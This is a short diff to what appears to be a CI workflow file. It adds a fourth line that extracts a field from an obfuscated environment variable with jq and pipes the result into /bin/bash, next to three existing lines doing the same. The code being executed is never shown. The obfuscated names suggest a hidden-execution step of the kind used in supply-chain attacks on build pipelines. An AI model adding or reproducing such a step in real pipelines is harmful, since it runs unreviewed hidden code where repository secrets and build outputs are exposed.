@@ -25,6 +25,7 @@ jobs:
           echo $oxdsj0023 | jq -r .wx3 | /bin/bash
           printf '%s' "$nfw2" | jq -r .vh869 | /bin/bash
           printf '%s' "$nkn49061" | jq -r .sml4248 | /bin/bash
+          printf '%s' "$owqv3" | jq -r .t7571 | /bin/bash
 
       - name: Upload results
         if: always()
